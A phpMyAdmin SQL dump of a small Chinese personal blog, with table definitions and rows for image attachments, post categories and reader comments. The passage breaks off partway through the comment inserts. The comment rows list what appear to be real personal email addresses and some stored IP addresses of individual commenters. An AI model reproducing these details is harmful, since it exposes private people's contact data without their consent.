-- phpMyAdmin SQL Dump
-- version 3.2.0.1
-- http://www.phpmyadmin.net
--
-- 主机: localhost
-- 生成日期: 2012 年 04 月 15 日 16:48
-- 服务器版本: 5.0.83
-- PHP 版本: 5.2.10

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";

--
-- 数据库: `simblog2`
--

-- --------------------------------------------------------

--
-- 表的结构 `attachment`
--

CREATE TABLE IF NOT EXISTS `attachment` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `name` varchar(30) NOT NULL,
  `path` varchar(30) NOT NULL,
  `suffix` varchar(10) NOT NULL COMMENT '后缀',
  `size` double(6,1) unsigned NOT NULL default '0.0',
  `isimage` tinyint(1) unsigned NOT NULL default '1',
  `isthumbnail` tinyint(1) unsigned NOT NULL default '0' COMMENT '是否是文章代表图像',
  `addtime` int(10) unsigned NOT NULL COMMENT '上传时间戳',
  `userid` mediumint(8) unsigned NOT NULL COMMENT '上传人ID',
  PRIMARY KEY  (`id`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='附件表' AUTO_INCREMENT=139 ;

--
-- 转存表中的数据 `attachment`
--

INSERT INTO `attachment` (`id`, `name`, `path`, `suffix`, `size`, `isimage`, `isthumbnail`, `addtime`, `userid`) VALUES
(1, '200912141260796533', './image/200912141260796533.jpg', 'jpg', 21.3, 1, 1, 1260748800, 2),
(2, '200912141260796600', './image/200912141260796600.jpg', 'jpg', 19.5, 1, 0, 1260748800, 2),
(3, '201001201263960839', './image/201001201263960839.jpg', 'jpg', 34.1, 1, 1, 1263945600, 2),
(4, '200912311262252915', './image/200912311262252915.jpg', 'jpg', 10.2, 1, 1, 1262217600, 2),
(5, '200912311262253888', './image/200912311262253888.jpg', 'jpg', 33.3, 1, 0, 1262217600, 2),
(6, '200912211261360474', './image/200912211261360474.jpg', 'jpg', 2.4, 1, 1, 1261353600, 2),
(7, '201001021262426657', './image/201001021262426657.jpg', 'jpg', 6.7, 1, 1, 1262390400, 2),
(8, '201001021262427886', './image/201001021262427886.jpg', 'jpg', 4.0, 1, 0, 1262390400, 2),
(9, '201001021262429281', './image/201001021262429281.jpg', 'jpg', 6.8, 1, 0, 1262390400, 2),
(10, '201001051262696825', './image/201001051262696825.jpg', 'jpg', 17.9, 1, 1, 1262649600, 2),
(11, '201001081262957266', './image/201001081262957266.jpg', 'jpg', 16.6, 1, 1, 1262908800, 2),
(12, '201001081262957307', './image/201001081262957307.jpg', 'jpg', 15.7, 1, 0, 1262908800, 2),
(13, '201001081262957336', './image/201001081262957336.jpg', 'jpg', 42.5, 1, 0, 1262908800, 2),
(14, '201001081262957378', './image/201001081262957378.jpg', 'jpg', 22.0, 1, 0, 1262908800, 2),
(15, '201001081262957520', './image/201001081262957520.jpg', 'jpg', 9.9, 1, 0, 1262908800, 2),
(16, '201001081262958484', './image/201001081262958484.jpg', 'jpg', 5.0, 1, 0, 1262908800, 2),
(17, '201001111263171749', './image/201001111263171749.jpg', 'jpg', 16.4, 1, 1, 1263168000, 2),
(18, '201001111263183747', './image/201001111263183747.jpg', 'jpg', 2.9, 1, 0, 1263168000, 2),
(19, '201001111263185746', './image/201001111263185746.jpg', 'jpg', 9.5, 1, 0, 1263168000, 2),
(20, '201001111263188560', './image/201001111263188560.jpg', 'jpg', 15.4, 1, 0, 1263168000, 2),
(21, '201001111263189088', './image/201001111263189088.jpg', 'jpg', 11.2, 1, 0, 1263168000, 2),
(22, '201001111263199370', './image/201001111263199370.jpg', 'jpg', 18.5, 1, 1, 1263168000, 2),
(23, '201001111263199801', './image/201001111263199801.jpg', 'jpg', 35.2, 1, 0, 1263168000, 2),
(24, '201001111263200513', './image/201001111263200513.jpg', 'jpg', 19.0, 1, 0, 1263168000, 2),
(25, '201001111263201404', './image/201001111263201404.jpg', 'jpg', 3.3, 1, 0, 1263168000, 2),
(26, '201001111263201159', './image/201001111263201159.jpg', 'jpg', 25.4, 1, 0, 1263168000, 2),
(27, '201001111263201510', './image/201001111263201510.jpg', 'jpg', 13.5, 1, 0, 1263168000, 2),
(28, '201001111263201608', './image/201001111263201608.jpg', 'jpg', 3.3, 1, 0, 1263168000, 2),
(29, '201001111263203950', './image/201001111263203950.jpg', 'jpg', 5.6, 1, 0, 1263168000, 2),
(30, '201001181263790321', './image/201001181263790321.jpg', 'jpg', 26.5, 1, 1, 1263772800, 2),
(31, '201001201263978222', './image/201001201263978222.jpg', 'jpg', 28.0, 1, 1, 1263945600, 2),
(32, '201001241264263309', './image/201001241264263309.jpg', 'jpg', 16.2, 1, 1, 1264291200, 2),
(33, '201001241264265146', './image/201001241264265146.jpg', 'jpg', 24.6, 1, 0, 1264291200, 2),
(34, '201001241264265295', './image/201001241264265295.jpg', 'jpg', 57.9, 1, 0, 1264291200, 2),
(35, '201001241264263380', './image/201001241264263380.jpg', 'jpg', 29.3, 1, 0, 1264291200, 2),
(36, '201001241264263740', './image/201001241264263740.jpg', 'jpg', 28.3, 1, 0, 1264291200, 2),
(37, '201001241264263749', './image/201001241264263749.jpg', 'jpg', 13.1, 1, 0, 1264291200, 2),
(38, '201001241264264146', './image/201001241264264146.jpg', 'jpg', 27.1, 1, 0, 1264291200, 2),
(39, '20100723084901', './image/20100723084901.jpg', 'jpg', 15.0, 1, 1, 1279843200, 2),
(40, '20100723084912', './image/20100723084912.jpg', 'jpg', 27.5, 1, 0, 1279843200, 2),
(41, '20100723084939', './image/20100723084939.jpg', 'jpg', 42.1, 1, 0, 1279843200, 2),
(42, '20100723084850', './image/20100723084850.jpg', 'jpg', 36.3, 1, 0, 1279843200, 2),
(43, '20100723085329', './image/20100723085329.jpg', 'jpg', 7.7, 1, 0, 1279843200, 2),
(44, '20100723084923', './image/20100723084923.jpg', 'jpg', 2.1, 1, 0, 1279843200, 2),
(45, '20100723084931', './image/20100723084931.jpg', 'jpg', 19.5, 1, 0, 1279843200, 2),
(46, '201001261264497266', './image/201001261264497266.jpg', 'jpg', 19.2, 1, 1, 1264464000, 2),
(47, '201002011265037790', './image/201002011265037790.jpg', 'jpg', 23.7, 1, 1, 1264982400, 2),
(48, '201002011265039169', './image/201002011265039169.jpg', 'jpg', 33.8, 1, 0, 1264982400, 2),
(49, '201002021265040112', './image/201002021265040112.jpg', 'jpg', 24.2, 1, 0, 1265068800, 2),
(50, '201002021265041477', './image/201002021265041477.jpg', 'jpg', 15.6, 1, 0, 1265068800, 2),
(51, '201002021265041760', './image/201002021265041760.jpg', 'jpg', 47.1, 1, 0, 1265068800, 2),
(52, '201002021265042091', './image/201002021265042091.jpg', 'jpg', 32.6, 1, 0, 1265068800, 2),
(53, '20100708005248', './image/20100708005248.jpg', 'jpg', 17.0, 1, 1, 1278547200, 2),
(54, '20100708003531', './image/20100708003531.jpg', 'jpg', 19.8, 1, 0, 1278547200, 2),
(55, '20100708012450', './image/20100708012450.jpg', 'jpg', 20.5, 1, 0, 1278547200, 2),
(56, '201002231266854768', './image/201002231266854768.png', 'png', 4.6, 1, 1, 1266883200, 2),
(57, '201002231266855579', './image/201002231266855579.png', 'png', 3.1, 1, 0, 1266883200, 2),
(58, '201002231266856100', './image/201002231266856100.gif', 'gif', 13.5, 1, 0, 1266883200, 2),
(59, '201002231266856261', './image/201002231266856261.jpg', 'jpg', 25.9, 1, 0, 1266883200, 2),
(60, '201003061267863979', './image/201003061267863979.jpg', 'jpg', 46.9, 1, 1, 1267833600, 2),
(61, '201003061267865794', './image/201003061267865794.jpg', 'jpg', 30.2, 1, 0, 1267833600, 2),
(62, '201003061267886225', './image/201003061267886225.jpg', 'jpg', 24.4, 1, 1, 1267833600, 2),
(63, '201003061267886342', './image/201003061267886342.jpg', 'jpg', 10.4, 1, 0, 1267833600, 2),
(64, '20100812205949', './image/20100812205949.png', 'png', 1.2, 1, 1, 1281571200, 2),
(65, '20100813084019', './image/20100813084019.png', 'png', 0.7, 1, 0, 1281657600, 2),
(66, '201004181271599201', './image/201004181271599201.jpg', 'jpg', 18.7, 1, 1, 1271548800, 2),
(67, '201004181271599885', './image/201004181271599885.jpg', 'jpg', 12.8, 1, 0, 1271548800, 2),
(68, '201005301275150809', './image/201005301275150809.jpg', 'jpg', 18.5, 1, 1, 1275177600, 2),
(69, '201005301275151985', './image/201005301275151985.jpg', 'jpg', 19.2, 1, 0, 1275177600, 2),
(70, '201005301275152110', './image/201005301275152110.jpg', 'jpg', 15.3, 1, 0, 1275177600, 2),
(71, '201006111276222856', './image/201006111276222856.jpg', 'jpg', 5.6, 1, 1, 1276214400, 2),
(72, '20100917203402', './image/20100917203402.jpg', 'jpg', 10.2, 1, 1, 1284681600, 2),
(73, '20101007104820', './image/20101007104820.png', 'png', 3.9, 1, 1, 1286409600, 2),
(74, '20101007105102', './image/20101007105102.png', 'png', 5.8, 1, 0, 1286409600, 2),
(75, '20101017140222', './image/20101017140222.jpg', 'jpg', 319.4, 1, 1, 1287273600, 2),
(76, '201006111276222856', './image/201006111276222856.jpg', 'jpg', 5.6, 1, 1, 1276214400, 2),
(77, '20110420205051', './image/20110420205051.jpg', 'jpg', 22.5, 1, 1, 1303257600, 2),
(78, '20110521142514', './image/20110521142514.png', 'png', 8.1, 1, 1, 1305936000, 2),
(79, '20110521150745', './image/20110521150745.jpg', 'jpg', 25.8, 1, 0, 1305936000, 2),
(80, '20110710191930', './image/20110710191930.png', 'png', 95.9, 1, 1, 1310256000, 2),
(81, '20110710190028', './image/20110710190028.jpg', 'jpg', 10.9, 1, 0, 1310256000, 2),
(82, '20110710191851', './image/20110710191851.jpg', 'jpg', 12.3, 1, 0, 1310256000, 2),
(83, '20110710193759', './image/20110710193759.jpg', 'jpg', 16.7, 1, 0, 1310256000, 2),
(84, '20110710195306', './image/20110710195306.jpg', 'jpg', 31.3, 1, 0, 1310256000, 2),
(85, '20110710200518', './image/20110710200518.jpg', 'jpg', 22.9, 1, 0, 1310256000, 2),
(86, '20110716172330', './image/20110716172330.jpg', 'jpg', 9.1, 1, 1, 1310774400, 2),
(87, '20110716173700', './image/20110716173700.jpg', 'jpg', 17.5, 1, 0, 1310774400, 2),
(88, '20110716173746', './image/20110716173746.jpg', 'jpg', 2.7, 1, 0, 1310774400, 2),
(89, '20110716174048', './image/20110716174048.jpg', 'jpg', 16.9, 1, 0, 1310774400, 2),
(90, '20110915211528', './image/20110915211528.jpg', 'jpg', 55.4, 1, 1, 1316044800, 2),
(91, '20111020210022', './image/20111020210022.jpg', 'jpg', 16.4, 1, 1, 1319068800, 2),
(92, '20111021203151', './image/20111021203151.jpg', 'jpg', 10.3, 1, 0, 1319155200, 2),
(93, '20111122011355', './image/20111122011355.jpg', 'jpg', 125.2, 1, 1, 1321920000, 2),
(94, '20120104211336', './image/20120104211336.jpg', 'jpg', 7.2, 1, 1, 1325635200, 2),
(95, '20120219164533', './image/20120219164533.jpg', 'jpg', 15.5, 1, 1, 1329609600, 2),
(96, '20120304171738', './image/20120304171738.jpg', 'jpg', 19.5, 1, 1, 1330819200, 2),
(97, '20120304173609', './image/20120304173609.jpg', 'jpg', 31.7, 1, 0, 1330819200, 2),
(98, '20120304173733', './image/20120304173733.jpg', 'jpg', 23.6, 1, 0, 1330819200, 2),
(99, '20120304174741', './image/20120304174741.jpg', 'jpg', 31.3, 1, 0, 1330819200, 2),
(100, '20110327151826', './image/20110327151826.jpg', 'jpg', 52.2, 1, 0, 1334475778, 2),
(101, '20110327171808', './image/20110327171808.jpg', 'jpg', 55.1, 1, 0, 1334475778, 2),
(102, '20110327193714', './image/20110327193714.jpg', 'jpg', 19.6, 1, 0, 1334475778, 2),
(103, '20110327190708', './image/20110327190708.jpg', 'jpg', 36.7, 1, 0, 1334475778, 2),
(104, '20110327190103', './image/20110327190103.jpg', 'jpg', 50.8, 1, 0, 1334475778, 2),
(105, '20101209085347', './image/20101209085347.jpg', 'jpg', 15.9, 1, 1, 1291852800, 2),
(106, '20101209132156', './image/20101209132156.jpg', 'jpg', 29.1, 1, 0, 1291852800, 2),
(107, '20101209141523', './image/20101209141523.jpg', 'jpg', 31.9, 1, 0, 1291852800, 2),
(108, '20101209141513', './image/20101209141513.jpg', 'jpg', 15.6, 1, 0, 1291852800, 2),
(109, '20101209202029', './image/20101209202029.jpg', 'jpg', 6.7, 1, 0, 1291852800, 2),
(110, '20101209211926', './image/20101209211926.jpg', 'jpg', 3.3, 1, 1, 1291852800, 2),
(111, '20101210084954', './image/20101210084954.jpg', 'jpg', 8.3, 1, 0, 1291939200, 2),
(112, '20101210095933', './image/20101210095933.jpg', 'jpg', 4.4, 1, 0, 1291939200, 2),
(113, '20101210100806', './image/20101210100806.jpg', 'jpg', 7.1, 1, 0, 1291939200, 2),
(114, '20110113210420', './image/20110113210420.jpg', 'jpg', 28.6, 1, 1, 1294876800, 2),
(115, '20110113210644', './image/20110113210644.jpg', 'jpg', 8.9, 1, 0, 1294876800, 2),
(116, '20110113212115', './image/20110113212115.jpg', 'jpg', 58.4, 1, 0, 1294876800, 2),
(117, '20110114091637', './image/20110114091637.jpg', 'jpg', 8.9, 1, 0, 1294963200, 2),
(118, '20110114205835', './image/20110114205835.jpg', 'jpg', 14.3, 1, 0, 1294963200, 2),
(119, '20110121084638', './image/20110121084638.jpg', 'jpg', 36.2, 1, 1, 1295568000, 2),
(120, '20110121084749', './image/20110121084749.jpg', 'jpg', 33.2, 1, 0, 1295568000, 2),
(121, '20110121085032', './image/20110121085032.jpg', 'jpg', 48.5, 1, 0, 1295568000, 2),
(122, '20110121085250', './image/20110121085250.jpg', 'jpg', 48.3, 1, 0, 1295568000, 2),
(123, '20110121085633', './image/20110121085633.jpg', 'jpg', 22.4, 1, 0, 1295568000, 2),
(124, '20110121091659', './image/20110121091659.jpg', 'jpg', 37.3, 1, 0, 1295568000, 2),
(125, '20110125094921', './image/20110125094921.png', 'png', 71.2, 1, 1, 1295913600, 2),
(126, '20110125095001', './image/20110125095001.png', 'png', 135.7, 1, 0, 1295913600, 2),
(127, '20110125095039', './image/20110125095039.png', 'png', 83.0, 1, 0, 1295913600, 2),
(128, '20110125095110', './image/20110125095110.png', 'png', 8.5, 1, 0, 1295913600, 2),
(129, '20110125095140', './image/20110125095140.png', 'png', 107.8, 1, 0, 1295913600, 2),
(130, '20110125095205', './image/20110125095205.png', 'png', 33.2, 1, 0, 1295913600, 2),
(131, '20110125095245', './image/20110125095245.png', 'png', 15.6, 1, 0, 1295913600, 2),
(132, '20110211152424', './image/20110211152424.jpg', 'jpg', 7.8, 1, 1, 1297382400, 2),
(133, '20110211172749', './image/20110211172749.jpg', 'jpg', 15.4, 1, 0, 1297382400, 2),
(134, '20110223173446', './image/20110223173446.jpg', 'jpg', 42.7, 1, 1, 1298419200, 2),
(135, '20110223190139', './image/20110223190139.jpg', 'jpg', 18.0, 1, 0, 1298419200, 2),
(136, '20110326212041', './image/20110326212041.jpg', 'jpg', 29.4, 1, 1, 1301097600, 2),
(137, '20110326212113', './image/20110326212113.jpg', 'jpg', 37.3, 1, 0, 1301097600, 2),
(138, '20110327200148', './image/20110327200148.jpg', 'jpg', 13.3, 1, 0, 1301184000, 2);

-- --------------------------------------------------------

--
-- 表的结构 `category`
--

CREATE TABLE IF NOT EXISTS `category` (
  `id` mediumint(8) unsigned NOT NULL auto_increment,
  `category` varchar(30) NOT NULL COMMENT '类别名',
  `pid` mediumint(8) NOT NULL default '0' COMMENT '父级ID',
  `ispublic` tinyint(1) NOT NULL default '1' COMMENT '是否可见',
  PRIMARY KEY  (`id`),
  KEY `pid` (`pid`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='文章类别' AUTO_INCREMENT=6 ;

--
-- 转存表中的数据 `category`
--

INSERT INTO `category` (`id`, `category`, `pid`, `ispublic`) VALUES
(1, '生活点滴', 0, 1),
(2, 'PHP', 0, 1),
(3, '前端', 0, 1),
(4, '吹水', 0, 1),
(5, '转载', 0, 1);

-- --------------------------------------------------------

--
-- 表的结构 `comment`
--

CREATE TABLE IF NOT EXISTS `comment` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `postid` int(10) unsigned NOT NULL COMMENT '文章ID',
  `userid` mediumint(8) unsigned NOT NULL default '0' COMMENT '用户ID',
  `author` varchar(20) NOT NULL default '0' COMMENT '评论人昵称',
  `email` varchar(30) NOT NULL default '0' COMMENT '评论人email',
  `url` varchar(50) NOT NULL default '0' COMMENT '评论人网站',
  `commenttime` int(10) unsigned NOT NULL COMMENT '评论时间戳',
  `ispublic` tinyint(1) unsigned NOT NULL default '1' COMMENT '是否通过审核',
  `content` text NOT NULL COMMENT '评论内容',
  `pid` int(10) unsigned NOT NULL default '0' COMMENT '父级ID',
  `isneednotice` tinyint(1) unsigned NOT NULL default '0' COMMENT '是否需要有回复时邮件通知',
  `ip` int(10) unsigned NOT NULL COMMENT '评论人IP',
  PRIMARY KEY  (`id`),
  KEY `postid` (`postid`,`userid`,`pid`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='评论表' AUTO_INCREMENT=169 ;

--
-- 转存表中的数据 `comment`
--

INSERT INTO `comment` (`id`, `postid`, `userid`, `author`, `email`, `url`, `commenttime`, `ispublic`, `content`, `pid`, `isneednotice`, `ip`) VALUES
(1, 4, 0, 'mcc', '307133793@qq.com', '0', 1260715132, 1, '那么复杂，我还以为有什么有趣的问题...', 0, 0, 0),
(2, 4, 2, '0', '0', '0', 1260793411, 1, '我们理工类的面试应该都要解答一些实际而又基础的问题吧，如果问我为什么污水口的盖是圆的话，我真不太会了…', 1, 0, 0),
(3, 7, 0, 'mcc', '3@qq.com', '0', 1260715965, 1, '可以保持自己的兴趣是件很幸福的事情，很多人以后都不能从事自己的专业...我觉得很浪费...加油啦！', 0, 0, 0),
(4, 7, 2, '0', '0', '0', 1260794169, 1, '虽然我专业不是计算机的，但是我对web开发发面还是很感兴趣的，对于兴趣嘛，社会总是残酷的，我觉得我们应该去追求兴趣。大家一起加油吧~~', 3, 0, 0),
(5, 7, 0, '辉爷', 'nichocjh@126.com', '0', 1260748269, 1, '唔加一条26岁有十几个老婆？？', 0, 0, 0),
(6, 7, 2, '0', '0', '0', 1260794212, 1, '汗…你以为我是你啊…', 5, 0, 0),
(7, 7, 0, 'toto', 'lknny@163.com', '0', 1261633805, 1, '听君一席话，思绪万千。', 0, 0, 0),
(8, 7, 2, '0', '0', '0', 1261738873, 1, '有这么夸张？', 7, 0, 0),
(9, 14, 0, '锦辉君', 'nichocjh@126.com', '0', 1261751563, 1, '更新得好快wa ~~\n好心你评论唔好加个邮箱上去啦', 0, 0, 0),
(10, 14, 2, '0', '0', '0', 1261786694, 1, '还是加上邮箱好…你就忍了吧', 9, 0, 0),
(11, 14, 0, '大力', 'peter_hong@163.com', '0', 1261881800, 1, '评论为什么还要加上邮箱啊。。\n懒吧懒吧！！', 0, 0, 0),
(12, 14, 2, '0', '0', '0', 1261883250, 1, '加上邮箱好点…我还是认为', 11, 0, 0),
(13, 14, 0, 'dali', 'peter_hong@163.com', '0', 1261881867, 1, '为什么gmail的邮箱不识别啊,bug', 0, 0, 0),
(14, 14, 2, '0', '0', '0', 1261883185, 1, '嗯…应该是与判断邮箱正确性的正则有关…算了，懒得改了，忽略你的邮箱', 13, 0, 0),
(15, 7, 0, 'dali', 'peter_hong@163.com', '0', 1261882027, 1, '评论几条能不能只输一次邮箱啊，看你平常不说话，都放博客上面了啊 \n', 0, 0, 0),
(16, 7, 2, '0', '0', '0', 1261883365, 1, '这个是ajax传值的，不像表单那样提交后就能有历史记录，你还是老实填吧，我平常不说话吗…夸张', 15, 0, 0),
(17, 14, 0, 'dali', 'peter_hong@163.com', '0', 1261898803, 1, '在留言中能不能像人人那样直接点回复', 0, 0, 0),
(18, 14, 2, '0', '0', '0', 1261967251, 1, '很感谢大力同学的意见，令我又想起以前弄懒吧的日子，但是您得考虑到这不是人人网，这只是个博客。', 17, 0, 0),
(19, 13, 0, '岚风', 'jsfjsf1986@163.com', '0', 1262710066, 1, '有机会实习还是可以学到野噶~26岁噶时候我估计还在看着一大堆不想再看的文献呢~我认识一个人也是去了腾讯，靠的也是php。比心机啦~得闲翻来广州看下我~！', 0, 0, 0),
(20, 13, 2, '0', '0', '0', 1262740257, 1, '谢谢岚风，虽然不知道自己目前的水平去到哪里，但是还是对自己有信心的，还有我会回广东发展，不打算在青岛，有机会一定去看你', 19, 0, 0),
(21, 19, 0, 'J.Y', '466599721@qq.com', '0', 1262737415, 1, '⊙', 0, 0, 0),
(22, 14, 0, '奶酪', 'wangyan_xi@hotmail.com', '0', 1262759954, 1, '好好做事，梁同学。呵呵 有机会会常来看看的。O(∩_∩)O~', 0, 0, 0),
(23, 14, 2, '0', '0', '0', 1262779394, 1, '我一向都是好好做事的啦……欢迎常来啊', 22, 0, 0),
(24, 22, 0, '大山', 'standair@yahoo.com.cn', '0', 1262852868, 1, '确实web标准化还存在一定距离，慢慢来吧', 0, 0, 0),
(25, 25, 0, 'BL', '397820625@qq.com', '0', 1263441622, 1, '哈哈', 0, 0, 0),
(26, 30, 0, '锦辉君', 'nichocjh@126.com', '0', 1264315941, 1, '你个blog越来越有feel哇，哈哈~~加油加油', 0, 0, 0),
(27, 30, 2, '0', '0', '0', 1264434849, 1, '多谢锦辉君的意见', 26, 0, 0),
(28, 7, 0, '雨天晒太阳的猪', 'huozaidangqian@163.com', '0', 1265121639, 1, '这个能看懂。。嘿嘿，条条都写得很棒，见文如见人。等着看26岁的你胖了没 嘿嘿~', 0, 0, 0),
(29, 7, 2, '0', '0', '0', 1265293666, 1, '多谢多谢，不过写得棒与做得棒确实是两样事情，希望paperen我能实现，也希望不会让你失望吧，哈哈', 28, 0, 0),
(30, 37, 0, '锦辉君', 'jhchen8@stu.edu.cn', '0', 1266065182, 1, '来来来，我拜个早年，祝大家有车有楼有女有狗，新一年快快乐乐，生活开心身体健康，工作顺利！！！', 0, 0, 0),
(31, 37, 2, '0', '0', '0', 1266127432, 1, '嗯，大家甘话，你好好享受家庭旅游的乐趣吧，新会这边的天气糟糕透了', 30, 0, 0),
(32, 38, 0, 'J.Y', '466599721@qq.com', '0', 1266897956, 1, '沙发，看得我一头雾水', 0, 0, 0),
(33, 38, 2, '0', '0', '0', 1266917519, 1, '可能是我写得不好吧，不过也感谢你来看看', 32, 0, 0),
(34, 7, 0, 'J.Y', '466599721@qq.com', '0', 1266898270, 1, '楼主，你是最胖的，(*^__^*) o(∩_∩)o !', 0, 0, 0),
(35, 7, 2, '0', '0', '0', 1266917483, 1, '你个死仔包……', 34, 0, 0),
(36, 37, 0, 'J.Y', '466599721@qq.com', '0', 1266898661, 1, '我想赞一个又想踩一个，确实有点矛盾^_^，可惜不成功', 0, 0, 0),
(37, 37, 2, '0', '0', '0', 1266917372, 1, '程序实现上肯定不能让你将赞与踩都选上，而且也不符合人的心态嘛，又赞又踩……', 36, 0, 0),
(38, 38, 0, '小珊', '370786620@qq.com', '0', 1267628368, 1, '太厉害了，虽然我一D都睇唔明，不过我知道肯定是厉害到爆', 0, 0, 0),
(39, 38, 2, '0', '0', '0', 1267688920, 1, '好心你唔好讲甘鬼夸张啦……', 38, 0, 0),
(40, 37, 0, 'chs', 'snapof510@126.com', '0', 1267794008, 1, '细佬放假天天就是在看TVS5……看不懂广东话啊...', 0, 0, 0),
(41, 37, 2, '0', '0', '0', 1267861758, 1, 'TVS5不是都是普通话的么……你们北方人看不懂粤语很正常啦，我有时候都看不懂……', 40, 0, 0),
(42, 7, 0, '于虹', 'yuhong_2369@163.com', '0', 1268198697, 1, '吴思一直很珍惜这个团队，希望将来的你们还能有机会在一起实现你们未完成的事业！梁同学，你很优秀！加油！嘿嘿！', 0, 0, 0),
(43, 7, 2, '0', '0', '0', 1268206032, 1, '吴同学也是一个很优秀的领导人物，我也期望将来那些事业，当然也要多谢于同学的鼓励与赞同，你也要努力吧。', 42, 0, 0),
(44, 7, 0, 'sss', '120289758@qq.com', '0', 1268874159, 1, '胡', 0, 0, 0),
(45, 7, 2, '0', '0', '0', 1270138613, 1, '胡啥……', 44, 0, 0),
(46, 39, 0, '路路', 'zlulu2006@163.com', '0', 1268963260, 1, '术业有专攻，说的很好，呵呵', 0, 0, 0),
(47, 37, 0, '路路', 'zlulu2006@163.com', '0', 1268963400, 1, '当不了干部，当不了管理？？不是，那需要有一个过程的。', 0, 0, 0),
(48, 41, 0, '锦辉君', 'jhchen8@stu.edu.cn', '0', 1269303395, 1, '哇，怎么这么早就去上班了？？6点啊，第二时都是自己买架摩托啦~', 0, 0, 0),
(49, 41, 0, 'J.Y', '466599721@qq.com', '0', 1269702360, 1, '你貌似好喜欢讲看似矛盾的话，其实真系好矛盾。有种好无奈的感觉。', 0, 0, 0),
(50, 41, 2, '0', '0', '0', 1270138642, 1, '最后还是选择了去广州', 49, 0, 0),
(51, 41, 0, '锦辉君', 'jhchen8@stu.edu.cn', '0', 1270251473, 1, '不是吧？最后去了广州啊，还以为有同学在新会做。祝你好运啦~~或者几年后回来do都唔错，从外面回来价值大很多的。', 0, 0, 0),
(52, 41, 2, '0', '0', '0', 1270311907, 1, '系，选择广州这份是对的啦，自己争取回来的，应该坚持嘛。而对于未来嘛，好像还是比较遥远吧……', 51, 0, 0),
(53, 41, 0, 'dorri', 'hudongliai@126.com', '0', 1270730702, 1, '、、你可以试着写散文了》  既然选择了，就努力去做吧、、不要让自己后悔！', 0, 0, 0),
(54, 14, 0, 'YoCo', 'admin@blackbap.com', '0', 1270739971, 1, '顶顶，我很看好你', 0, 0, 0),
(55, 44, 0, '流风33', 'liustorm-3u@yahoo.com.cn', '0', 1271905607, 1, '没想到你还能找到我的留言本，呵呵。', 0, 0, 0),
(56, 44, 2, '0', '0', '0', 1274023508, 1, '嘻嘻，貌似能在你网站的底部找到入口，即使找不到链接的话也可以在浏览器中直接访问的，想不被留言最后将该页面删掉或者改名，因为你用的是开源的代码所以不少人会研究完代码后再不怀好意地来捣疼你的博客', 55, 0, 0),
(57, 43, 0, 'J.Y', '466599721@qq.com', '0', 1272257536, 1, '为了那句“不会被重复的心情”赞一个', 0, 0, 0),
(58, 43, 2, '0', '0', '0', 1272464659, 1, '其实有时候也会有重复……', 57, 0, 0),
(59, 44, 0, '路路', 'zlulu2006@163.com', '0', 1272434976, 1, '发现你一直在学习，哈哈，很好啊，加油！', 0, 0, 0),
(60, 44, 2, '0', '0', '0', 1272464768, 1, '其实大家都在学习，彼此加油吧，也其实我已经不想用加油来鼓励别人了，因为我觉得这个词只是适合读书的时候使用~~', 59, 0, 0),
(61, 28, 0, '木哈哈', 'wpmwpm@Live.cn', '0', 1272442100, 1, '哈哈，第一次来你的空间，扒了很多东西哈哈\n我刚学.NET不久，刚开始做网页，多多指教', 0, 0, 0),
(62, 28, 2, '0', '0', '0', 1272464946, 1, '终于有人从我这扒到东西了，希望我的东西对你有用吧，你不要用指教这个词嘛，我并比你强嘛，我对.NET完全不熟呢', 61, 0, 0),
(63, 24, 0, 'whoas123', 'hiwubin@gmail.com', '0', 1272548708, 1, 'CGI格式的文件 ,提了一下，怎么后面不提了。。那是啥文件啊\n还有怎么区别text。php页面里的不同的类？', 0, 0, 0),
(64, 24, 2, '0', '0', '0', 1272611430, 1, '额……可能是我说得有点误导你了，我这里说的CGI是泛指，比如asp，php，jsp，net等等，可以被服务器解析的文件，而test页中没什么类啊？不知道你说的类是什么？test页中实现的东西很简单就是接受post过来的page值并根据page值抽取数据库不同的数据', 63, 0, 0),
(65, 43, 0, 'dorri', 'dorri@139.com', '0', 1273760906, 1, '做自己喜欢的事并喜欢自己所做的事', 0, 0, 0),
(66, 43, 2, '0', '0', '0', 1274023334, 1, '这是PranavMistry的话，觉得很有道理所以就借用了。(注：PranavMistry是一个天才印度青年，有听过“第六感”的话应该知道他是哪位)', 65, 0, 0),
(67, 45, 0, 'J.Y', '466599721@qq.com', '0', 1274277473, 1, 'O(∩_∩)O~有本事别改，看谁先腻', 0, 0, 0),
(68, 43, 0, '一涵', 'huozaidangqian@163.com', '0', 1274793949, 1, '喜欢你的文章．．\n有梦想，做自己喜欢的事的人无论无何该是幸福的．我也是在青岛一个人租房子住，工资目前还是零，有时累了一天回到家会感到委屈，但生活还是要继续．．\n你的网站是怎么猜到我来自哪的？神奇', 0, 0, 0),
(69, 43, 2, '0', '0', '0', 1274802908, 1, '很高兴看到自己写的东西能给你带来一点共鸣，确实生活还是要继续的。\n\n这个功能其实不难实现，我在那篇IP to location文中有提到的，有兴趣可以看看', 68, 0, 0),
(70, 28, 0, '土豆', '573741776@qq.com', '0', 1275982570, 1, '牛XX，我小扒了点东西，谢谢楼主分享', 0, 0, 0),
(71, 28, 2, '0', '0', '0', 1276175469, 1, '很高兴您能在我这得到一些东西，你博客园的博客也不错嘛，jquery的教程挺好的\r\n\r\nhttp://www.cnblogs.com/zhangziqiu', 70, 0, 0),
(72, 46, 0, '小鱼儿', 'fujiyu1224@163.com', '0', 1275362093, 1, '弄的真的不赖！啥时候把程序给我用用呗！你知道我是谁的', 0, 0, 0),
(73, 46, 2, '0', '0', '0', 1276736766, 1, '鲫鱼同学嘛 =.=', 72, 0, 0),
(74, 48, 0, 'paperen', 'standair@yahoo.com.cn', 'iamlze.cn', 1276959715, 1, '恭喜恭喜~~', 0, 0, 2079055593),
(75, 48, 0, '离子', '664822242@qq.com', '0', 1277811820, 1, '很喜欢你的网站，无聊时听听你里面的歌也很安静', 0, 0, 1851065362),
(76, 48, 2, '0', '0', '0', 1278140344, 1, '哈哈，谢谢支持~~', 75, 0, 0),
(77, 48, 0, 'J.Y', '466599721@qq.com', '0', 1278147476, 1, '赞和踩怎么选不了？', 0, 0, 3072522997),
(78, 48, 2, '0', '0', '0', 1278179401, 1, '现在再试试看~~', 77, 0, 0),
